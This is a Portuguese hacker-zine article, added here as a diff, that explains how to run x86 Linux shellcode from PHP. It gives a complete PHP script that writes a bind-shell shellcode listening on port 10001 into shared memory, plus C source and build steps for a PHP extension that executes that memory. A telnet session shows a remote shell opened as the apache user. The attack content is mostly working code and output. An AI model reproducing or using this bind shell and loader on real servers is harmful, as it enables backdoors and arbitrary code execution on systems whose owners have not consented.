@@ -1,0 +1,673 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[04]-=[Shellcode em PHP]-=|tDs|-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+________________
+| [1] INTRODUÇÃO |
+`================
+Sometimes, PHP "as is" simply isn't enough. Although these cases are rare
+for the average user, professional applications will soon lead PHP to the edge
+of its capabilities, in terms of either speed or functionality. New
+functionality cannot always be implemented natively due to language
+restrictions and inconveniences that arise when having to carry around a huge
+library of default code appended to every single script, so another method
+needs to be found for overcoming these eventual lacks in PHP.
+As soon as this point is reached, it's time to touch the heart of PHP and
+take a look at its core, the C code that makes PHP go.
+http://www.zend.com/apidoc/zend.php
+
+External modules can be loaded at script runtime using the function dl().
+This function loads a shared object from disk and makes its functionality
+available to the script to which it's being bound. After the script is
+terminated, the external module is discarded from memory.
+http://www.zend.com/apidoc/zend.possibilities.php
+
+A criação de módulos em PHP pode ser algo muito interessante, desde que
+os propósitos desta criação sejam interessantes. Ultrapassar os limites de
+alguma coisa normalmente é interessante. Então, podemos tentar ultrapassar os
+limites do PHP e executar shellcodes em scripts nesta linguagem.
+
+
+____________________________________________
+| [2] O QUE SERÁ NECESSÁRIO E COMO SERÁ FEITO|
+`============================================
+Para executarmos um shellcode utilizando um script em PHP, serão
+necessários dois itens:
+
+- O shellcode que se deseja executar;
+- Alguma função que execute shellcodes armazenados em segmentos de memória
+compartilhada.
+
+O primeiro item é fácil de se adquirir (seja fazendo um "na unha" ou
+procurando no google). Para o segundo, existe uma ferramenta desenvolvida
+pelo sloth do nopninjas (encontrei esta ferramenta no site
+http://www.shellcode.com.ar/linux/lnx-shm_shell.c ). Usarei ele, com algumas
+modificações.
+
+Será feito da seguinte forma:
+
+1 - Primeiro, deve-se colocar o shellcode em um segmento de memória
+compartilhada em um determinado id. Para fazer isso são necessários dois passos:
+
+a) Criar o segmento de memória compartilhada, utilizando a função
+shmop_open (). Uma breve descrição desta função, do manual do php:
+
+int shmop_open ( int key, string flags, int mode, int size)
+shmop_open() pode criar ou abrir um bloco de memória compartilhada.
+shmop_open() pega 4 parâmetros: chave, que é usado pelo id do sistema para
+o bloco de memória compartilhada, esse parâmetro pode ser passado como
+decimal ou hexadecimal. O segundo parâmetro são flags que você pode usar:
+
+* "a" para acesso (seta SHM_RDONLY para shmat) use essa flag quando você
+precisar abrir um bloco de memória compartilhada existente como somente
+leitura
+
+* "c" para criar (seta IPC_CREATE) use essa flag quando você precisar criar
+um novo bloco de memória compartilhada ou se um segmento com a mesma chave
+existir, tente abrir isso para ler e escrever
+
+* "w" para ler & acesso à escrita use essa flag quando você precisar ler e
+escrever para um segmento de bloco de memória compartilhada, use essa flag
+na maior parte dos casos.
+
+* "n" cria um novo segmento de memória (seta IPC_CREATE|IPC_EXCL) use essa
+flag quando você quer criar um novo segmento de memória compartilhada mas
+se um já existir com a mesma flag, irá falhar. Isso é útil para propósitos
+de segurança, usando isso você pode previnir rápidos exploits.
+
+O terceiro parâmetro é o modo, que são permissões que você deseja designar
+para o seu segmento de memória, estas são as mesmas permissões para o
+arquivo. Permissões precisam ser passadas no formato octal ex. 0644.
+O último parâmetro é o tamanho do bloco de memória compartilhada que você
+deseja criar em bytes.
+
+
+b) Colocar o shellcode no segmento de memória compartilhada criado
+anteriormente, utilizando a função shmop_write (). Uma breve descrição
+desta função, do manual do php:
+
+int shmop_write ( int shmid, string data, int offset)
+shmop_write() irá escrever uma string em um bloco de memória compartilhada.
+shmop_write() pega 3 parâmetros: shmid, que é o identificador do bloco de
+memória compartilhada criado por shmop_open(), dados, uma string que você
+quer escrever em um bloco de memória compartilhada e o último, que
+especifica onde começa a escrita de dados dentro do segmento de memória
+compartilhada.
+
+2 - Uma vez com o shellcode ja na memória, é necessario executar o conteúdo
+deste segmento como se fosse um código executável (e é). Existem dois modos
+(sim, existem mais) para se executar o shellcode.
+
+a) Compilar a ferramenta que foi citada acima e executa-la. Mas, se posso
+executar um binário que eu mesmo criei no servidor por que eu iria querer
+executar um shellcode em memória compartilhada, se eu posso criar um
+binário que faça a mesma coisa que o shellcode? Talvez por diversão.
+Então, parte-se do suposto que você não pode (ou não quer) executar um
+binário através das funções de execução do PHP (system, shell_exec, ...)
+ou via linha de comando. Temos então a opção b:
+
+b) Criar uma extensão, em c, que desempenhe o mesmo papel da ferramenta
+citada anteriomente. Nesta extensão, exportariamos uma função que, quando
+chamada, executasse o segmento de memória compartilhada que fosse indicado.
+
+Por motivos óbvios, será usada a segunda opção.
+
+
+______________________________________
+| [3] COLOCANDO O SHELLCODE NA MEMÓRIA |
+`======================================
+Esta provavelmente seja a parte mais fácil. Não estarei mostrando como
+criar um shellcode, por já ter muito material bom na internet (colocarei
+alguns links ao fim do texto, onde você poderá aprender a desenvolver
+shellcodes e também pegar alguns exemplos prontos.
+Como dito anteriormente, o shellcode será colocado na memória utilizando
+as funções de memória compartilhada. Utilizarei um shellcode de uma bindshell.
+Vejamos como pode ser feito:
+
+---shellcode_up.php-----------------------------------------------------------
+
+<?php
+/*
+bind shell
+porta 10001
+tamanho 92 bytes
+*/
+$shellcode =
+"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd".
+"\x80\x89\xc7\x52\x66\x68"."\x27\x11". /*<-- porta em hex */
+"\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0".
+"\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43".
+"\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2".
+"\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51".
+"\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80";
+
+$key = 0xfacedead;
+/*
+cria bloco de memoria compartilhada
+id = 0xfacedead
+tamanho = 92 bytes
+*/
+$shmAbre = shmop_open($key, "c", 0666, strlen ($shellcode))
+or die ("Erro ao criar bloco.\n");
+
+/*
+Coloca o shellcode no bloco de memoria criado anteriomente,
+iniciando da posicao 0 (inicio do bloco)
+*/
+$shmEsc = shmop_write($shmAbre, $shellcode, 0);
+if($shmEsc != strlen($shellcode))
+die ("Erro ao escrever no bloco.\n");
+echo 'Bloco criado e shellcode colocado na memoria. Manda ver! (shmid =
+'.$shmAbre.' )<br>';
+
+/*
+Deleta o bloco de memoria compartilhada, 15 segundos apos criar
+*/
+sleep (15);
+if(!shmop_delete($shmAbre)) {
+die ("Erro ao deletar bloco.");
+}
+
+
+/*
+Fecha o bloco de memoria compartilhada
+*/
+shmop_close($shmAbre);
+echo 'Bloco destruido.<br>';
+?>
+
+---fim de shellcode_up.php----------------------------------------------------
+
+Agora, observando os segmentos de memória compartilhada, antes de executar
+o script, temos:
+
+$ whatis ipcs
+ipcs (8) - provide information on ipc facilities
+$ ipcs -m
+------ Shared Memory Segments --------
+key shmid owner perms bytes nattch status
+0x00000000 11862018 tds 600 393216 2 dest
+0x00000000 11894787 tds 600 393216 2 dest
+0x00000000 14090244 tds 777 393216 2 dest
+0x00000000 22511621 root 644 151552 2 dest
+
+Após a execução do script, temos o seguinte (durante 15 segundos apenas,
+conforme informado no script):
+
+$ ipcs -m
+------ Shared Memory Segments --------
+key shmid owner perms bytes nattch status
+0xfacedead 89292801 apache 666 92 1 <-------------.
+0x00000000 11862018 tds 600 393216 2 dest |
+0x00000000 11894787 tds 600 393216 2 dest |
+0x00000000 14090244 tds 777 393216 2 dest |
+0x00000000 22511621 root 644 151552 2 dest |
+|
+nosso shellcode está aqui <-------+
+
+Como nota-se, o segmento foi criado. O proprietário é o usuário apache
+(o mesmo que executa o processo do servidor apache) e as permissões de acesso
+estão em 666 (as permissões são semelhantes as permissões de acesso a
+arquivos), conforme foi indicado no script.
+Foi dito que a para a execução de shellcode utilizando scripts em php eram
+necessários dois passos:
+
+"Primeiro deve-se colocar o shellcode em um segmento de memória
+compartilhada
+em um determinado id".
+
+O primeiro passo então já foi concretizado. O shellcode já pode ser
+colocado na memória e temos o id do segmento (0xfacedead). O segundo passo é:
+
+"Uma vez com o shellcode já na memória, é necessario executar o conteúdo
+deste segmento como se fosse um código executável (e é)".
+
+Como foi visto, a execução deste segmento de memória compartilhada se dará
+pela utilização de um módulo. Vamos a criação dele agora.
+
+
+_______________________
+| [4] CRIAÇÃO DO MÓDULO |
+`=======================
+A criação do módulo será feita utilizando a última versão do PHP (php 5).
+Primeiramente será necessário baixar o fonte dele, no endereço
+http://br.php.net/get/php-5.0.0.tar.bz2/from/a/mirror . Após copia-lo,
+descompacte-o em algum diretório. Descompactei ele em "/tmp/php-5.0.0/".
+A criação de módulos não será explicada detalhadamente, pois não é este
+o objetivo, então, apenas alguns comentários serão feitos durante este
+desenvolvimento.
+Uma vez no diretório do fonte do PHP, vemos diversos sub-diretórios. Por
+enquanto é necessário apenas entrar no sub-diretório "ext/"
+("/tmp/php-5.0.0/ext/"). Ali encontra-se um shellscript que cria o "framework"
+básico para a criação do módulo, o ext_skel. A utilização dele é bastante
+simples:
+
+tds@matrix:/tmp/php-5.0.0/ext$ ./ext_skel --extname=facedead
+
+Desta forma, será criado um diretório chamado "facedead" juntamente com
+oito arquivos e um sub-diretório. Apenas três destes arquivos são importantes,
+"config.m4", "facedead.c" e "php_facedead.h". Vejamos agora qual será (não
+como ele está logo após a criação, mas como ele deve ficar) o conteúdo de cada
+um dos três arquivos:
+
+---config.m4------------------------------------------------------------------
+
+PHP_ARG_WITH(facedead, for facedead support,
+[ --with-facedead Include facedead support])
+
+if test "$PHP_FACEDEAD" != "no"; then
+PHP_NEW_EXTENSION(facedead, facedead.c, $ext_shared)
+fi
+
+---fim de config.m4-----------------------------------------------------------
+
+---php_facedead.h-------------------------------------------------------------
+
+#ifndef PHP_FACEDEAD_H
+#define PHP_FACEDEAD_H
+
+extern zend_module_entry facedead_module_entry;
+#define phpext_facedead_ptr &facedead_module_entry
+
+#ifdef PHP_WIN32
+#define PHP_FACEDEAD_API __declspec(dllexport)
+#else
+#define PHP_FACEDEAD_API
+#endif
+
+#ifdef ZTS
+#include "TSRM.h"
+#endif
+
+PHP_MINIT_FUNCTION(facedead);
+PHP_MSHUTDOWN_FUNCTION(facedead);
+PHP_RINIT_FUNCTION(facedead);
+PHP_RSHUTDOWN_FUNCTION(facedead);
+PHP_MINFO_FUNCTION(facedead);
+PHP_FUNCTION(exec_shellcode);
+
+#ifdef ZTS
+#define FACEDEAD_G(v) TSRMG(facedead_globals_id, zend_facedead_globals *, v)
+#else
+#define FACEDEAD_G(v) (facedead_globals.v)
+#endif
+#endif
+
+---fim de php_facedead.h------------------------------------------------------
+
+---facedead.c-----------------------------------------------------------------
+
+#ifdef HAVE_CONFIG_H
+#include "config.h"
+#endif
+
+#include "php.h"
+#include "php_ini.h"
+#include "ext/standard/info.h"
+#include "php_facedead.h"
+
+static int le_facedead;
+
+function_entry facedead_functions[] = {
+PHP_FE(exec_shellcode, NULL)
+{NULL, NULL, NULL}
+};
+
+
+zend_module_entry facedead_module_entry = {
+#if ZEND_MODULE_API_NO >= 20010901
+STANDARD_MODULE_HEADER,
+#endif
+"facedead",
+facedead_functions,
+PHP_MINIT(facedead),
+PHP_MSHUTDOWN(facedead),
+PHP_RINIT(facedead),
+PHP_RSHUTDOWN(facedead),
+PHP_MINFO(facedead),
+#if ZEND_MODULE_API_NO >= 20010901
+"0.1",
+#endif
+STANDARD_MODULE_PROPERTIES
+};
+
+#ifdef COMPILE_DL_FACEDEAD
+ZEND_GET_MODULE(facedead)
+#endif
+
+PHP_MINIT_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_MSHUTDOWN_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_RINIT_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_RSHUTDOWN_FUNCTION(facedead)
+{
+return SUCCESS;
+}
+
+PHP_MINFO_FUNCTION(facedead)
+{
+php_info_print_table_start();
+php_info_print_table_header(1, "facedead by tDs - tds@m...");
+php_info_print_table_end();
+
+}
+
+PHP_FUNCTION(exec_shellcode)
+{
+char shm[] =
+"\x31\xff\x31\xf6\x31\xd2\xb9"
+"\xad\xde\xce\xfa\x31\xdb\xb3\x17\x31"
+"\xc0\xb0\x75\xcd\x80\x31\xff\xbe\xfa\xff\xff\xbf\x31\xd2\x89\xc1"
+"\x31\xdb\xb3\x15\x31\xc0\xb0\x75\xcd\x80\xb8\xfa\xff\xff\xbf\xff"
+"\x30\xc3";
+
+void (*shell)() = (void *)&shm;
+zend_printf ("Shell code executado.");
+shell ();
+}
+
+---fim de facedead.c----------------------------------------------------------
+
+Resumidamente, temos o arquivo de configuração, um header e o arquivo
+principal.
+No arquivo principal, temos diversas funcões, algumas requeridas e
+outras não. A função que nos interessa é a "PHP_FUNCTION(exec_shellcode)".
+Esta função, que estará embutida no módulo, criará uma outra função, acessível
+aos scripts em PHP, chamada "exec_shellcode ()". Esta função contém um
+"shellcode que executa shellcodes" (!). Em uma parte deste shellcode, temos
+o id do segmento de memória compartilhada que contém o nosso shellcode, o que
+será executado. O trecho é o seguinte: "\xad\xde\xce\xfa". (A versão
+original utiliza a id "0xdeadbeef". A modificação se deu exclusivamente para
+que o id tivesse o mesmo nome do projeto). O original se encontra em
+http://www.shellcode.com.ar/linux/lnx-shm_shell.c
+Após ter os arquivos prontos, iremos trabalhar no diretório
+"/tmp/php-5.0.0/ext/facedead". Primeiro, executamos o comando "phpize", já
+dentro do diretório citado:
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ phpize
+Configuring for:
+PHP Api Version: 20031224
+Zend Module Api No: 20040412
+Zend Extension Api No: 220040412
+
+Serão criados vários arquivos no diretório e mais alguns sub-diretórios.
+Nenhuma mudança mais é necessária em nenhum dos arquivos que foram criados.
+Após isso, temos somente que executar um "./configure" e um "make":
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ ./configure
+checking build system type... i686-pc-linux-gnu
+checking host system type... i686-pc-linux-gnu
+checking for gcc... gcc
+checking for C compiler default output... a.out
+...
+creating libtool
+configure: creating ./config.status
+config.status: creating config.h
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ make
+/bin/sh /tmp/php-5.0.0/ext/facedead/libtool --mode=compile gcc
+-I. -I/tmp/php-5.0.0/ext/facedead -DPHP_ATOM_INC
+-I/tmp/php-5.0.0/ext/facedead/include
+-I/tmp/php-5.0.0/ext/facedead/main
+-I/tmp/php-5.0.0/ext/facedead
+...
+----------------------------------------------------------------------
+Libraries have been installed in:
+/tmp/php-5.0.0/ext/facedead/modules
+...
+See any operating system documentation about shared libraries for
+more information, such as the ld(1) and ld.so(8) manual pages.
+----------------------------------------------------------------------
+
+Build complete.
+(It is safe to ignore warnings about tempnam and tmpnam).
+
+Após o make, o nosso módulo ja estará pronto, no diretório
+"/tmp/php-5.0.0/ext/facedead/modules", com o nome "facedead.so":
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ ls -lh modules/facedead.so
+-rwxr-xr-x 1 tds users 55K Jul 14 16:52 modules/facedead.so*
+
+Podemos ainda diminuir o tamanho do módulo, usando o comando "strip":
+
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ whatis strip
+strip (1) - Discard symbols from object files
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ strip -s modules/facedead.so
+tds@matrix:/tmp/php-5.0.0/ext/facedead$ ls -lh modules/facedead.so
+-rwxr-xr-x 1 tds users 4.5K Jul 14 17:06 modules/facedead.so*
+
+Para os propósitos, ficou muito bom, doze vezes menor e funcionando da
+mesma forma. O segundo dos dois ítens necessários para executar-mos shellcodes
+utilizando PHP está pronto. Só nos falta testar.
+
+
+____________________________
+| [5] EXECUTANDO O SHELLCODE |
+`============================
+Agora que já podemos colocar o shellcode na memória, utilizando o script
+"shellcode_up.php", e temos uma função, que executa este shellcode, localizada
+em um módulo, só temos que fazer o seguinte:
+
+- Executar o script "shellcode_up.php", para colocar o shellcode na
+memória;
+- Carregar o módulo que contém a nossa função de execução de shellcodes;
+- Chamar a função e verificar se o shellcode foi executado;
+
+Vamos fazer isso tudo em um segundo script em PHP:
+
+---facedead.php---------------------------------------------------------------
+
+<?php
+/*
+bind shell
+porta 10001
+tamanho 92 bytes
+*/
+$shellcode =
+"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd".
+"\x80\x89\xc7\x52\x66\x68"."\x27\x11". /*<-- porta em hex */
+"\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0".
+"\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43".
+"\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2".
+"\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51".
+"\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80";
+
+$key = 0xfacedead;
+/*
+cria bloco de memoria compartilhada
+id = 0xfacedead
+tamanho = 92 bytes
+*/
+$shmAbre = shmop_open($key, "c", 0666, strlen ($shellcode))
+or die ("Erro ao criar bloco.\n");
+
+/*
+Coloca o shellcode no bloco de memoria criado anteriomente,
+iniciando da posicao 0 (inicio do bloco)
+*/
+$shmEsc = shmop_write($shmAbre, $shellcode, 0);
+if($shmEsc != strlen($shellcode))
+die ("Erro ao escrever no bloco.\n");
+echo 'Bloco criado e shellcode colocado na memoria. Manda ver! (shmid =
+'.$shmAbre.' )<br>';
+
+/*
+Carrega o modulo p
+*/
+dl ("facedead.so");
+/*
+Executa a funcao que ira executar o nosso shellcode
+*/
+exec_shellcode ();
+?>
+
+
+---fim de facedead.php--------------------------------------------------------
+
+O que o script faz é colocar o shellcode na memória, carregar o módulo e
+chamar a função que irá executar o nosso shellcode. Note que, obviamente, o
+módulo (arquivo "facedead.so") deve estar no mesmo diretório do script em PHP
+(arquivo "facedead.php"):
+
+tds@matrix:/home/www/facedead$ ls -l
+total 4500
+-rw-r--r-- 1 tds users 1203 Jul 14 17:27 facedead.php
+-rwxr-xr-x 1 tds users 4604 Jul 14 17:05 facedead.so*
+-rw-r--r-- 1 tds users 1329 Jul 14 17:28 shellcode_up.php
+
+Para executar o script, basta acessa-lo pelo seu endereço. Aqui ele está
+em "http://127.0.0.1/facedead/facedead.php".
+Após executa-lo, tentamos acessar o endereço, na porta 10001 via telnet:
+
+tds@matrix:/home/www/facedead$ telnet 127.0.0.1 10001
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+uname -a;id;
+Linux matrix 2.4.22 #6 Tue Sep 2 17:43:01 PDT 2003 i686 unknown
+unknown GNU/Linux
+uid=1006(apache) gid=103(apache) groups=103(apache)
+: command not found
+exit;
+Connection closed by foreign host.
+
+Como esperado, funcionou corretamente.
+Após a execução do script, ele ficará em carregamento, como se estivesse
+executando alguma tarefa. Ele normalmente só terminaria depois que alguém
+conectar-se via telnet na porta que foi bindada e desconectar (após o "exit;"
+ele foi finalizado). Uma coisa que pode ser feita, sem problemas, é interromper
+a execução do script, alguns segundos depois de sua execução. Como a porta já
+vai ter sido bindada, nada irá ocorrer e o acesso a shell ainda estará
+disponível.
+
+
+__________________________
+| [6] AMPLIANDO HORIZONTES |
+`==========================
+Muito pode ser feito utilizando-se esta "técnica". Poderia expor diversos
+exemplos aqui, mas perderia a graça de testar outras coisas e descobrir novas
+possibilidades. Alguns shellcodes "não vão funcionar", a não ser que sejam
+executado via linha de comando (na realidade funcionar ele vai, apenas não vai
+ser exibido nenhum retorno no browser). Um exemplo seria:
+
+---cat_motd.php---------------------------------------------------------------
+
+<?php
+/*
+* This shellcode will do a cat of /etc/motd
+* Written by zillion@s...
+* tamanho 71 bytes
+*/
+$shellcode =
+"\xeb\x21\x5e\x31\xc0\x88\x46\x08\x88\x46\x12\x89\x76\x13\x8d".
+"\x5e\x09\x89\x5e\x17\x89\x46\x1b\xb0\x0b\x89\xf3\x8d\x4e\x13".
+"\x8d\x56\x1b\xcd\x80\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f".
+"\x63\x61\x74\x38\x2f\x65\x74\x63\x2f\x6d\x6f\x74\x64\x32\x33".
+"\x34\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65";
+
+echo strlen ($shellcode);
+
+$key = 0xfacedead;
+/*
+cria bloco de memoria compartilhada
+id = 0xfacedead
+tamanho = 71 bytes
+*/
+$shmAbre = shmop_open($key, "c", 0666, strlen ($shellcode))
+or die ("Erro ao criar bloco.\n");
+
+/*
+Coloca o shellcode no bloco de memoria criado anteriomente,
+iniciando da posicao 0 (inicio do bloco)
+*/
+$shmEsc = shmop_write($shmAbre, $shellcode, 0);
+if($shmEsc != strlen($shellcode))
+die ("Erro ao escrever no bloco.\n");
+
+/*
+Carrega o modulo p
+*/
+dl ("facedead.so");
+/*
+Executa a funcao que ira executar o nosso shellcode
+*/
+exec_shellcode ();
+?>
+
+---fim de cat_motd.php--------------------------------------------------------
+
+Se executar-mos este script através do browser, nada será exibido nele.
+Mas, caso seja executado via linha de comando teremos:
+
+tds@matrix:/home/www/facedead$ php cat_motd.php
+Shell code executado.Linux 2.4.22.
+
+Vejamos o conteúdo do arquivo "/etc/motd":
+
+tds@matrix:/home/www/facedead$ cat /etc/motd
+Linux 2.4.22.
+
+Perfeitamente funcional. A mensagem "Shell code executado" faz parte do
+módulo, veja as seguintes linhas:
+...
+void (*shell)() = (void *)&shm;
+zend_printf ("Shell code executado.");
+shell ();
+...
+
+A mensagem pode ser retirada, está ai somente para propósitos de "debug".
+
+
+__________________________________
+| [7] CONSIDERAÇÕES FINAIS E LINKS |
+`==================================
+O conceito é bastante interessante (eu acho) e espero ter sido
+compreensível nas idéias que expus (ou tentei). Caso tenha alguma dúvida sobre
+o assunto, estou a disposição para trocar idéias e tentar esclarecer algo.
+Apenas gostaria de deixar claro o seguinte:
+1 - não sou programador, então não venha com críticas não construtivas
+sobre a qualidade do meu código. Se ele pode ou não ser escrito em doze
+linhas ao invés de cem, ótimo, deixo esta tarefa para quem sabe realmente
+programar.
+2 - A questão de estar utilizando partes de códigos de terceiros
+(shellcodes apenas) não é por não saber fazer. Poderia aumentar o texto em
+algumas centanas, milhares de linhas para uma breve explicação de como um
+shellcode funciona. Mas fica a questão: Pra que reinventar a roda, se da
+forma que está ela está funciona muito bem e preenche todos os requisitos
+que são necessários? Prefiro indicar links para uma observação mais
+detalhada.
+
+Bons estudos.
+
+
+http://tds.motdlabs.org/
+http://www.motdlabs.org
+http://cdm.frontthescene.com.br
+http://www.frontthescene.com.br
+/j #motd -> irc.freenode.net
+
+http://guide.motdlabs.org/edicoes/guide02/shellsemsegredos.txt
+Texto sobre shellcodes, partindo do básico e chegando ao intermediário/
+avancado. Ao final do texto encontra-se diversos outros links, alguns
+com textos mais básicos, outros com textos mais avançados e links para
+exemplos de shellcodes prontos.
+
+http://www.shellcode.com.ar/linux/lnx-shm_shell.c
+Shellcode que executa shellcodes.
+
+http://www.google.com.br
+Tudo.
+
+"Tudo da certo no fim, se não deu é porque ainda não chegou no fim"
